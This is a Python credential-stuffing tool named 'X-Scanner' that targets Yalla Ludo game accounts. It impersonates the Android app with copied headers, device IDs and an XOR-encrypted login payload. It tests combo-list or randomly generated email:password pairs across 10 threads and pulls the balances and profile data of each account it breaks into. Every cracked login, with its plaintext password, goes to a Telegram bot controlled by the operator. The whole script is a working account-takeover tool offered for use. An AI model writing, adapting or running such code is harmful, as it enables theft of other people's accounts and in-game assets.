# ============================================
# X-Scanner - Yalla Ludo Checker v3.0
# @Aegriss
# ============================================

import base64
import json
import hashlib
import requests
import time
import os
import sys
import random
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== COLORS ====================
class Colors:
    G = '\033[92m'
    Y = '\033[93m'
    C = '\033[96m'
    R = '\033[91m'
    P = '\033[95m'
    W = '\033[97m'
    RST = '\033[0m'
    B = '\033[1m'

# ==================== CONFIG ====================
XOR_KEY = bytes.fromhex("6230346534663137366230663463313562343062626462383437623930353766")
LOGIN_URL = "https://httpgateway.lampjkl.com/api/LudoAccountLoginRpcApiProxy/EMailAccountLogin"
USER_INFO_URL = "https://httpgateway.lampjkl.com/api/LudoUserRpcApiProxy/GetUserInfo"

HEADERS = {
    'User-Agent': "YallaLudo-1.4.9.2-(Build 1040922)-Android 33",
    'Accept-Encoding': "gzip",
    'traceparent': "00-d7efd49d37f50362aeb3e7e0a0737059-bef01ce4bef8cd27-00",
    'baggage': "service.name=ludo",
    'userid': "0",
    'x-app-id': "ludo",
    'x-baggage': "eyJ0aW1lU3BhbiI6IjE3ODYyMzg5MzQ3NjIiLCJ2ZXJzaW9uIjoiMS40LjkuMiIsImRldmljZUlkIjoiNjRjNWU4MzQtZGY3ZC00M2FiLTkwNjQtZjIxMzYyOWU4N2U1IiwiZGV2aWNlTmFtZSI6InJlYWxtZSBSTVgzMDg1IiwiZGV2aWNlVHlwZSI6MiwiZG93bmxvYWRDaGFubmVsSWQiOjEsInNodU1lbmdJZCI6IkRVWm8ybzJvZDltbWtBb1VCZnNFbEdYNGZEb2lXNlhudDNnZCIsIm5vbmNlIjoiMTk3MTUxNTA1X2IzYmQ4ZGZiLWExMmMtNGY1ZC1iNjAxLTA0YjkxY2YzMjUzNSIsInBsYXRlVHlwZSI6MCwiTGFuZ3VhZ2VJZCI6MiwicGhvbmVNb2RlbCI6IlJNWDMwODUiLCJYLVBob25lLUNvdW50cnkiOiJJUSIsIlgtU2ltLUNvdW50cnkiOiJJUSIsIkFuZHJvaWRJZCI6ImZmNmM4MzE4MzNjODM1NThhNGU3ZWFjMTcyMDdiZDU5X2UzOGRiNzllYjExZjczNTIiLCJhcHBUeXBlIjowfQ==",
    'x-access-token': "",
    'x-timestamp': "",
    'versionstring': "1.4.9.2",
    'x-sign': "2.0_2_592f987b54b740542e5b64f20adab59704c74f278577267b0dab4c715f641318",
    'x-hera': "0904a97e8845424b978828fea548a22e",
    'x-medusa': "LH0xDQnBijiGhBHp+tvV6CGKLkGPK6kouHYuFBleWGRvN4kjD+jcWYMFMOYKrs1aCiJ+EJqPpIv/ktEQ9D88zc1LDD2/naWZP2dA6pi+4g8=",
    'x-time': "",
    'content-type': "application/json; charset=utf-8"
}

PAYLOAD_TEMPLATE = {
    "email": "",
    "password": "",
    "languageId": 2,
    "hostConfig": [
        {"bizType": 5000, "countryCode": "IQ", "hostUrl": "https://api-shumeng.moonlmn.com", "type": 2, "version": 4},
        {"bizType": 5001, "countryCode": "", "hostUrl": "ws://firebreak.yalla.games", "type": 1, "version": 1},
        {"bizType": 5002, "countryCode": "", "hostUrl": "", "type": 1, "version": 0},
        {"bizType": 5003, "countryCode": "", "hostUrl": "", "type": 1, "version": 0},
        {"bizType": 5004, "countryCode": "IQ", "hostUrl": "https://httpgateway.lampjkl.com", "type": 2, "version": 18},
        {"bizType": 5005, "countryCode": "IQ", "hostUrl": "https://broadcast.lampjkl.com", "type": 2, "version": 17},
        {"bizType": 5006, "countryCode": "IQ", "hostUrl": "https://broadcast-host.ylconfig.com", "type": 1, "version": 0},
        {"bizType": 5007, "countryCode": "IQ", "hostUrl": "https://file.carrstuv.com", "type": 2, "version": 27},
        {"bizType": 2001, "countryCode": "", "hostUrl": "https://roomapi.yalla.games,https://roomapi.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2002, "countryCode": "", "hostUrl": "https://roomclog.yalla.games,https://roomclog.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2003, "countryCode": "", "hostUrl": "https://roomlog.yalla.games,https://roomlog.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2004, "countryCode": "", "hostUrl": "https://roomconfig.yalla.games,https://roomconfig.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2005, "countryCode": "", "hostUrl": "https://roomab.yalla.games,https://roomab.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2006, "countryCode": "", "hostUrl": "https://roompay.yalla.games,https://roompay.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2007, "countryCode": "", "hostUrl": "https://roomactivity.yalla.games,https://roomactivity.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2008, "countryCode": "", "hostUrl": "https://roommail.yalla.games,https://roommail.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 1000, "countryCode": "IQ", "hostUrl": "https://account.lampjkl.com", "type": 2, "version": 19},
        {"bizType": 1001, "countryCode": "IQ", "hostUrl": "https://pay.lampjkl.com", "type": 2, "version": 17},
        {"bizType": 1002, "countryCode": "IQ", "hostUrl": "https://mail.lampjkl.com", "type": 2, "version": 18},
        {"bizType": 1003, "countryCode": "IQ", "hostUrl": "https://clog.lampjkl.com", "type": 2, "version": 17},
        {"bizType": 1004, "countryCode": "IQ", "hostUrl": "https://activity.lampjkl.com", "type": 2, "version": 18},
        {"bizType": 1005, "countryCode": "IQ", "hostUrl": "https://ab.lampjkl.com", "type": 2, "version": 17},
        {"bizType": 1006, "countryCode": "IQ", "hostUrl": "https://config.lampjkl.com", "type": 2, "version": 18},
        {"bizType": 1007, "countryCode": "IQ", "hostUrl": "https://game.lampjkl.com", "type": 2, "version": 17},
        {"bizType": 1008, "countryCode": "IQ", "hostUrl": "https://gameapi.lampjkl.com", "type": 2, "version": 18},
        {"bizType": 6000, "countryCode": "IQ", "hostUrl": "https://broadcast.lampjkl.com", "type": 1, "version": 0},
        {"bizType": 1009, "countryCode": "IQ", "hostUrl": "https://file.carrstuv.com", "type": 2, "version": 27},
        {"bizType": 3001, "countryCode": "IQ", "hostUrl": "https://social.lampjkl.com", "type": 2, "version": 18},
        {"bizType": 3002, "countryCode": "IQ", "hostUrl": "https://socialapi.lampjkl.com", "type": 2, "version": 17},
        {"bizType": 3003, "countryCode": "IQ", "hostUrl": "https://socialconfig.lampjkl.com", "type": 2, "version": 18},
        {"bizType": 3004, "countryCode": "IQ", "hostUrl": "https://socialpay.lampjkl.com", "type": 2, "version": 17}
    ],
    "timeSpan": "",
    "version": "1.4.9.2",
    "deviceId": "64c5e834-df7d-43ab-9064-f213629e87e5",
    "deviceName": "realme RMX3085",
    "deviceType": 2,
    "downloadChannelId": 1,
    "shuMengId": "DUZo2o2od9mmkAoUBfsElGX4fDoiW6Xnt3gd",
    "nonce": "197151505_b3bd8dfb-a12c-4f5d-b601-04b91cf32535",
    "plateType": 0,
    "phoneModel": "RMX3085",
    "X-Phone-Country": "IQ",
    "X-Sim-Country": "IQ",
    "AndroidId": "ff6c831833c83558a4e7eac17207bd59_e38db79eb11f7352",
    "IsSubpackages": 0,
    "appType": 0
}

# ==================== CORE ====================
def xor_encrypt(data):
    return bytes([data[i] ^ XOR_KEY[i % len(XOR_KEY)] for i in range(len(data))])

def build_payload(email, password):
    password_hash = hashlib.md5(password.encode()).hexdigest().upper()
    payload = PAYLOAD_TEMPLATE.copy()
    payload["email"] = email
    payload["password"] = password_hash
    payload["timeSpan"] = str(int(time.time() * 1000))
    
    json_bytes = json.dumps(payload, separators=(',', ':')).encode('utf-8')
    encrypted = xor_encrypt(json_bytes)
    return {"paramJsonString": base64.b64encode(encrypted).decode('utf-8')}

def login(email, password):
    timestamp = str(int(time.time() * 1000))
    headers = HEADERS.copy()
    headers["x-timestamp"] = timestamp
    headers["x-time"] = timestamp
    
    try:
        with requests.Session() as session:
            resp = session.post(LOGIN_URL, json=build_payload(email, password), 
                               headers=headers, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == 0:
                    return data.get("data", {})
    except:
        pass
    return None

def get_user_info(token, user_id):
    timestamp = str(int(time.time() * 1000))
    headers = HEADERS.copy()
    headers["x-timestamp"] = timestamp
    headers["x-time"] = timestamp
    headers["x-access-token"] = token
    
    payload = {"userId": int(user_id)}
    
    try:
        with requests.Session() as session:
            resp = session.post(USER_INFO_URL, json=payload, headers=headers, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == 0:
                    return data.get("data", {})
    except:
        pass
    return None

# ==================== TELEGRAM ====================
def send_telegram(token, chat_id, email, password, show_num_id, user_info, login_data):
    if not show_num_id:
        show_num_id = "N/A"
    
    level = user_info.get("level", "N/A") if user_info else "N/A"
    coin = user_info.get("coin", "N/A") if user_info else "N/A"
    diamond = user_info.get("diamond", "N/A") if user_info else "N/A"
    exp = user_info.get("exp", "N/A") if user_info else "N/A"
    vip = user_info.get("vip", "N/A") if user_info else "N/A"
    win = user_info.get("winCount", "N/A") if user_info else "N/A"
    lose = user_info.get("loseCount", "N/A") if user_info else "N/A"
    name = login_data.get("name", "N/A") if login_data else "N/A"
    
    text = f"""╔═══════════════════════════════════╗
║  X-SCANNER - YALLA LUDO HIT     ║
╠═══════════════════════════════════╣
║ ID  : {show_num_id}
║ NAME: {name}
║ MAIL: {email}
║ PASS: {password}
║ LVL : {level}
║ COIN: {coin}
║ DIA : {diamond}
║ EXP : {exp}
║ VIP : {vip}
║ WIN : {win}
║ LOSE: {lose}
║ @Aegriss
╚═══════════════════════════════════╝"""
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    try:
        requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=5)
    except:
        pass

# ==================== UI ====================
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_logo():
    clear_screen()
    print(f"""{Colors.C}
  ╔══════════════════════════╗
  ║  X-SCANNER  v3.0         ║
  ║  Yalla Ludo Checker      ║
  ║  @Aegriss                ║
  ╚══════════════════════════╝
{Colors.RST}""")

def print_dashboard(hits, bads, errors, total, checked):
    clear_screen()
    print_logo()
    print(f"""{Colors.C}
┌──────────────────────────┐
│       SCANNER STATUS     │
├──────────────────────────┤
│ {Colors.G}HITS   {Colors.RST}: {hits}             
│ {Colors.R}BADS   {Colors.RST}: {bads}             
│ {Colors.Y}ERRORS {Colors.RST}: {errors}            
│ {Colors.W}PROGRESS{Colors.RST}: {checked}/{total}    
└──────────────────────────┘
{Colors.RST}""")
    sys.stdout.flush()

# ==================== SCANNER ====================
def check_combo(email, password, bot_token, chat_id):
    login_data = login(email, password)
    if login_data:
        user_id = login_data.get("id")
        token = login_data.get("token")
        show_num_id = login_data.get("showNumId")
        
        user_info = get_user_info(token, user_id) if token else None
        
        if bot_token and chat_id:
            send_telegram(bot_token, chat_id, email, password, show_num_id, user_info, login_data)
        
        return True, login_data, user_info
    return False, None, None

def scan_random(bot_token, chat_id, count=10):
    print_logo()
    print(f"{Colors.C}[+] Scanning {count} accounts...{Colors.RST}\n")
    
    hits = 0
    bads = 0
    errors = 0
    
    for i in range(count):
        email = f"user{random.randint(10000, 99999)}@gmail.com"
        password = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=8))
        
        try:
            success, _, _ = check_combo(email, password, bot_token, chat_id)
            if success:
                hits += 1
                print(f"{Colors.G}[+] HIT {email}{Colors.RST}")
            else:
                bads += 1
                print(f"{Colors.R}[-] FAIL {email}{Colors.RST}")
        except:
            errors += 1
            print(f"{Colors.Y}[!] ERR {email}{Colors.RST}")
        
        print_dashboard(hits, bads, errors, count, i+1)
    
    print(f"\n{Colors.G}Results: {hits} hits | {bads} bads | {errors} errors{Colors.RST}")

def scan_combo_file(bot_token, chat_id, file_path):
    if not os.path.exists(file_path):
        print(f"{Colors.R}[!] File not found!{Colors.RST}")
        return
    
    with open(file_path, 'r', encoding='utf-8') as f:
        lines = [line.strip() for line in f if line.strip() and ':' in line]
    
    if not lines:
        print(f"{Colors.R}[!] No valid combos!{Colors.RST}")
        return
    
    print_logo()
    print(f"{Colors.C}[+] Loaded {len(lines)} accounts{Colors.RST}")
    print(f"{Colors.C}[+] Scanning...{Colors.RST}\n")
    
    hits = 0
    bads = 0
    errors = 0
    total = len(lines)
    checked = 0
    
    def process_combo(line):
        try:
            email, password = line.split(':', 1)
            email = email.strip()
            password = password.strip()
            success, _, _ = check_combo(email, password, bot_token, chat_id)
            return email, success
        except:
            return line.split(':', 1)[0].strip() if ':' in line else 'unknown', False
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(process_combo, line): line for line in lines}
        
        for future in as_completed(futures):
            email, success = future.result()
            checked += 1
            
            if success:
                hits += 1
                print(f"{Colors.G}[+] HIT {email}{Colors.RST}")
            else:
                bads += 1
                print(f"{Colors.R}[-] FAIL {email}{Colors.RST}")
            
            print_dashboard(hits, bads, errors, total, checked)
    
    print(f"\n{Colors.G}Results: {hits} hits | {bads} bads | {errors} errors{Colors.RST}")

# ==================== MAIN ====================
def main():
    print_logo()
    
    bot_token = input(f"{Colors.C}[?] Bot Token: {Colors.RST}").strip()
    chat_id = input(f"{Colors.C}[?] Chat ID: {Colors.RST}").strip()
    
    print(f"\n{Colors.P}────────────────────────")
    print(f"{Colors.C}[1] Random Scan")
    print(f"{Colors.C}[2] Combo File Scan")
    print(f"{Colors.P}────────────────────────")
    
    choice = input(f"{Colors.C}[?] Choose [1/2]: {Colors.RST}").strip()
    
    if choice == '1':
        try:
            count = int(input(f"{Colors.C}[?] Count: {Colors.RST}").strip())
        except:
            count = 10
        scan_random(bot_token, chat_id, count)
    elif choice == '2':
        file_path = input(f"{Colors.C}[?] File path: {Colors.RST}").strip()
        scan_combo_file(bot_token, chat_id, file_path)
    else:
        print(f"{Colors.R}[!] Invalid!{Colors.RST}")

if __name__ == "__main__":
    main()